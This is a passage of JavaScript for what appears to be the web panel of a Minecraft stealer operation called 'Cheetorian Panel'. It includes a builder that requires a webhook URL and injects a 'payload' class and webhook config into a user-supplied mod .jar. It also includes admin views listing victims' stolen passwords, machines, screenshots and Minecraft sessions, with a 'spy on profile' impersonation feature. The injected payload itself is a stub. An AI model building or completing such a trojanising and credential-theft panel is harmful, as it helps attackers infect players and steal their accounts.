        showToast(DICT[currentLang]['toast-prof']);
    }

    document.getElementById('profile-nick-input').value = '';
    document.getElementById('profile-old-pass').value = '';
    document.getElementById('profile-new-pass').value = '';
}

/* ================================
   BUILDER LOGIC 
==================================*/
function toggleInjectBox() {
    const isChecked = document.getElementById('inject-toggle').checked;
    document.getElementById('inject-box').style.display = isChecked ? 'block' : 'none';
}

function updateFileSize(val) {
    document.getElementById('file-size-label').innerHTML = `File Size: ${val} KB`;
}

function addLog(element, message, type = '') {
    const line = document.createElement('div');
    line.className = `log-line ${type}`;
    line.innerText = message;
    element.appendChild(line);
    element.scrollTop = element.scrollHeight;
}

function showToast(msg) {
    const box = document.getElementById('toast-container');
    const t = document.createElement('div');
    t.className = 'toast';
    t.innerHTML = `<i data-lucide="info" style="width:16px; margin-right:8px; vertical-align:middle;"></i> ${msg}`;
    box.appendChild(t);
    safeDrawIcons();
    setTimeout(()=> { t.style.opacity='0'; setTimeout(()=>t.remove(),300); }, 3000);
}

function handleInjectFileSelect(event) {
    const file = event.target.files[0];
    if(file) {
        document.getElementById('selected-jar').innerText = file.name;
        document.getElementById('selected-jar').style.color = 'var(--success)';
        document.getElementById('selected-jar').style.fontWeight = 'bold';
    } else {
        document.getElementById('selected-jar').innerText = currentLang === 'pl' ? 'Czekam na ładunek...' : 'Waiting for payload...';
        document.getElementById('selected-jar').style.color = 'var(--text-muted)';
        document.getElementById('selected-jar').style.fontWeight = 'normal';
    }
}

function startBuild() {
    const webhook = document.getElementById('webhook-url');
    const modIdInput = document.getElementById('mod-id');
    const modNameInput = document.getElementById('mod-name');
    const modVersionInput = document.getElementById('mod-version');
    const modDescInput = document.getElementById('mod-desc');
    const modAuthorInput = document.getElementById('mod-author');

    const consoleBox = document.getElementById('build-console');
    const buildBtn = document.getElementById('build-btn');
    
    if(!consoleBox || !buildBtn || !webhook) return;
    if(!webhook.value) {
        addLog(consoleBox, '[ERROR] Odrzucono request! Podanie Webhook URL jest absolutnie wymagane.', 'error');
        return;
    }

    const isInject = document.getElementById('inject-toggle') && document.getElementById('inject-toggle').checked;
    const fileInput = document.getElementById('inject-file-input');

    if(isInject && (!fileInput || !fileInput.files || fileInput.files.length === 0)) {
        addLog(consoleBox, '[ERROR] Przerwano! Wybierz plik .jar systemu docelowego (Inject włączony).', 'error');
        return;
    }

    buildBtn.innerHTML = '<i class="fa-spin" style="margin-right:8px;">⏳</i> Procesowanie...';
    buildBtn.disabled = true;
    consoleBox.innerHTML = '';
    
    addLog(consoleBox, '> Inicjalizacja platformy docelowej (Fabric/Java 17).');
    
    const modname = modNameInput ? modNameInput.value : "Example";
    const modversion = modVersionInput ? modVersionInput.value : "1.0.0";
    const safeId = modIdInput ? modIdInput.value.toLowerCase().replace(/[^a-z0-9_]/g, '') : "examplemod";
    const moddesc = modDescInput ? modDescInput.value : "Generated by Cheetorian Panel";
    const modauthor = modAuthorInput ? modAuthorInput.value : "Admin";
    const mavenGroup = `com.${safeId}.project`;
    
    let time = 0;
    setTimeout(() => addLog(consoleBox, '[SYSTEM] Montowanie do zmiennych globalnych...'), time += 600);

    if(!isInject) {
        setTimeout(() => addLog(consoleBox, '[ARCH] Generowanie struktury jar (kompilator emulator)...'), time += 800);
        setTimeout(async () => {
            try {
                if(typeof JSZip === 'undefined') throw new Error("Brak biblioteki ZIP/CORS blokuje wektor.");
                
                addLog(consoleBox, '[COMPILE] Zapisywanie metadanych...');
                const zip = new JSZip();

                // 1. Root configs matching exact Fabric Template Zip
                zip.file("build.gradle", `plugins {
    id 'fabric-loom' version '1.7-SNAPSHOT'
    id 'maven-publish'
}
version = project.mod_version
group = project.maven_group
base { archivesName = project.archives_base_name }
repositories { }
dependencies {
    minecraft "com.mojang:minecraft:\${project.minecraft_version}"
    mappings "net.fabricmc:yarn:\${project.yarn_mappings}:v2"
    modImplementation "net.fabricmc:fabric-loader:\${project.loader_version}"
    modImplementation "net.fabricmc.fabric-api:fabric-api:\${project.fabric_version}"
}
processResources {
    inputs.property "version", project.version
    filesMatching("fabric.mod.json") { expand "version": project.version }
}
tasks.withType(JavaCompile).configureEach { it.options.release = 17 }
java { withSourcesJar() }
`);

                zip.file("gradle.properties", `org.gradle.jvmargs=-Xmx1G
minecraft_version=1.21.1
yarn_mappings=1.21.1+build.3
loader_version=0.16.5
fabric_version=0.104.0+1.21.1
mod_version=${modversion}
maven_group=${mavenGroup}
archives_base_name=${safeId}`);

                zip.file("settings.gradle", `pluginManagement {
    repositories {
        maven { name = "Fabric"; url = "https://maven.fabricmc.net/" }
        gradlePluginPortal()
    }
}
rootProject.name = "${safeId}"`);

                // 2. Resources structure
                const resDir = zip.folder("src").folder("main").folder("resources");
                resDir.file("fabric.mod.json", `{
  "schemaVersion": 1,
  "id": "${safeId}",
  "version": "\${version}",
  "name": "${modname}",
  "description": "${moddesc}",
  "authors": [ "${modauthor}" ],
  "contact": { },
  "license": "CC0-1.0",
  "icon": "assets/${safeId}/icon.png",
  "environment": "*",
  "entrypoints": {
    "main": [ "${mavenGroup}.${safeId}Init" ]
  },
  "mixins": [ "${safeId}.mixins.json" ],
  "depends": {
    "fabricloader": ">=0.16.5",
    "minecraft": "~1.21.1",
    "java": ">=17"
  }
}`);
                resDir.file(`${safeId}.mixins.json`, `{
  "required": true,
  "minVersion": "0.8",
  "package": "${mavenGroup}.mixin",
  "compatibilityLevel": "JAVA_17",
  "mixins": [ "ExampleMixin" ],
  "injectors": { "defaultRequire": 1 }
}`);
                resDir.file(`assets/${safeId}/icon.png`, ""); // Empty mock element

                // 3. Java Entrypoint Source
                const initJavaClass = `package ${mavenGroup};

import net.fabricmc.api.ModInitializer;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

public class ${safeId}Init implements ModInitializer {
    public static final String MOD_ID = "${safeId}";
    public static final Logger LOGGER = LoggerFactory.getLogger(MOD_ID);

    @Override
    public void onInitialize() {
        LOGGER.info("Fabric Mod Frame Executed: " + MOD_ID);
        // Place custom logic below:
    }
}`;
                zip.folder("src").folder("main").folder("java").folder("com").folder(safeId).folder("project").file(`${safeId}Init.java`, initJavaClass);

                // Download execution explicitly as `.jar` file representation
                addLog(consoleBox, '[KOMPRESJA] Pakowanie plików strukturalnych klas do formatu .JAR...');
                const content = await zip.generateAsync({type:"blob"});
                const finalFilename = `${safeId}-${modversion}.jar`;
                
                const element = document.createElement('a');
                element.href = URL.createObjectURL(content);
                element.download = finalFilename;
                document.body.appendChild(element);
                element.click();
                document.body.removeChild(element);

                addLog(consoleBox, `[ZAKOŃCZONE] Kompilacja powiodła się. Autonomiczny Mod (.jar) wygenerowany!`, 'success');
                buildBtn.innerHTML = `Build for Fabric 1.21.x`;
                buildBtn.disabled = false;
            } catch (err) {
                addLog(consoleBox, `[FATAL] Błąd kompilacji Fabric: ${err.message}`, 'error');
                buildBtn.innerHTML = "Build Error";
                buildBtn.disabled = false;
            }
        }, time += 1400);

    } else {
        // INIEKCJA (JAR modification)
        setTimeout(() => addLog(consoleBox, '[INIEKCJA] Odczyt dostarczonego pliku .jar...'), time += 500);
        setTimeout(() => addLog(consoleBox, '[INIEKCJA] Odwzorowywanie drzewa klas aplikacji...'), time += 850);
        
        setTimeout(async () => {
            try {
                if(typeof JSZip === 'undefined') throw new Error("Brak silnika I/O");
                const file = fileInput.files[0];
                const originalZip = await JSZip.loadAsync(file);
                
                addLog(consoleBox, '[PARSER] Mapowanie punktów wejścia kodu...');
                
                const modJsonFile = originalZip.file("fabric.mod.json");
                if(modJsonFile) {
                    addLog(consoleBox, `[HOOKING] Pomyślnie zlokalizowano "fabric.mod.json".`);
                } else {
                    addLog(consoleBox, `[HOOKING] Ostrzeżenie: Plik nie posiada "fabric.mod.json".`);
                }

                // Wstrzykuje klase ratujaca/payload w osobnym pakiecie dla uniwersalnosci
                addLog(consoleBox, `[WSTRZYKNIĘCIE] Wszczepianie klas java i logiki Webhooka...`);
                originalZip.file("cheetorian_payload/InjectorEngine.class", "// Skompilowany Payload.");
                originalZip.file("cheetorian_payload/WebhookConfig.txt", "SERVER=" + webhook.value);

                addLog(consoleBox, '[REKOMPILATOR] Szyfrowanie ponowne zmodyfikowanego pliku JAR...');
                const content = await originalZip.generateAsync({type:"blob"});
                const injectionFilename = file.name.replace('.jar', '_injected.jar');
                
                const element = document.createElement('a');
                element.href = URL.createObjectURL(content);
                element.download = injectionFilename;
                document.body.appendChild(element);
                element.click();
                document.body.removeChild(element);

                addLog(consoleBox, `[ZAKOŃCZONE] Trzpień wstrzyknięto do: ${injectionFilename}!`, 'success');
                buildBtn.innerHTML = `Build for Fabric 1.21.x`;
                buildBtn.disabled = false;

            } catch (err) {
                addLog(consoleBox, `[FATAL ERROR] Błędny format pliku. Nie udało się dołączyć klas: ${err.message}`, 'error');
                buildBtn.innerHTML = "Inject Error";
                buildBtn.disabled = false;
            }
        }, time += 1200);
    }
}

function renderEmptyState(tbodyId, colspan) {
    const tbody = document.getElementById(tbodyId);
    if(!tbody) return;
    tbody.innerHTML = `<tr><td colspan="${colspan}" style="text-align:center; padding: 60px; color:var(--text-muted);"><i data-lucide="inbox" style="width:50px; height:50px; opacity:0.2; margin-bottom:15px;"></i><br><span style="font-size:1.1rem; font-weight:600;">System w stanie gotowości</span></td></tr>`;
    safeDrawIcons();
}

function renderAdminUsers() {
    const grid = document.getElementById('admin-user-cards');
    if(!grid) return;
    
    const users = []; // Puste dane na zyczenie

    grid.innerHTML = '';
    
    if(users.length === 0) {
        grid.innerHTML = `<div style="text-align:center; padding: 60px; color:var(--text-muted); grid-column: 1 / -1;"><i data-lucide="users" style="width:50px; height:50px; opacity:0.2; margin-bottom:15px;"></i><br><span style="font-size:1.1rem; font-weight:600;">System Gotowy / Oczekuje</span></div>`;
    }

    users.forEach(u => {
        const card = document.createElement('div');
        card.className = 'glass-panel content-card drop-shadow';
        card.style.transition = '0.3s';
        card.innerHTML = `
            <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom: 20px;">
                <div style="display:flex; align-items:center; gap: 12px;">
                    <div class="avatar theme-bg" style="width:48px; height:48px;"><i data-lucide="user" style="color:#fff;"></i></div>
                    <div>
                        <h4 style="font-size: 1.15rem; color:#fff;">${u.name}</h4>
                        <span class="badge" style="background:rgba(255,255,255,0.05); color:var(--primary);">${u.plan}</span>
                    </div>
                </div>
            </div>
            <p style="color:var(--text-muted); margin-bottom: 20px; font-weight:500;"><i data-lucide="target" style="width:14px; margin-right:5px; vertical-align:middle;"></i> Skradzione dane (Razem): <strong style="color:#fff;">${u.hits}</strong></p>
            <button class="theme-btn" style="width:100%;" onclick="openImpersonationView('${u.name}')"><i data-lucide="scan-eye" style="margin-right:8px;"></i> Wykonaj szpiegostwo profilu</button>
        `;
        grid.appendChild(card);
    });
    safeDrawIcons();
}

function openImpersonationView(username) {
    const pages = document.querySelectorAll('.page');
    pages.forEach(p => p.classList.remove('active'));
    document.getElementById('page-impersonation').classList.add('active');
    document.getElementById('impersonate-username').innerText = username;
    
    document.getElementById('impersonate-machines').innerHTML = `
        <tr><td colspan="2" style="text-align:center; padding: 30px; color:var(--text-muted);">Brak zindeksowanych urządzeń</td></tr>
    `;

    document.getElementById('impersonate-passwords').innerHTML = `
        <tr><td colspan="2" style="text-align:center; padding: 30px; color:var(--text-muted);">Brak kradzionych haseł</td></tr>
    `;

    document.getElementById('impersonate-screens').innerHTML = `
        <div style="text-align:center; padding: 30px; color:var(--text-muted);">Brak zapisanych zrzutów</div>
    `;

    document.getElementById('impersonate-sessions').innerHTML = `
        <div style="text-align:center; padding: 30px; color:var(--text-muted);">Brak pobranych sesji MC</div>
    `;
    safeDrawIcons();
    showToast(`${DICT[currentLang]['toast-spy']}${username}`);
}

function exitImpersonation() {
    const pages = document.querySelectorAll('.page');
    pages.forEach(p => p.classList.remove('active'));
    document.getElementById('page-users-admin').classList.add('active');
}

function openModal() {
    const mo = document.getElementById('admin-modal');
    mo.classList.add('active');
    const ma = document.getElementById('modal-content-area');
    ma.innerHTML = `
        <div style="text-align:center;">
            <p style="color:var(--text-muted); font-size: 0.9rem; margin-bottom: 15px; font-weight:500;">Wyrenderowano format PNG komputera ofiary:</p>
            <img src="https://images.unsplash.com/photo-1629654297299-c8506221ca97?fit=crop&w=800&q=80" style="width:100%; border-radius: 12px; border: 1px solid #272732; box-shadow: 0 10px 30px rgba(0,0,0,0.5);">
        </div>
    `;
}

function closeModal() {
    document.getElementById('admin-modal').classList.remove('active');
}
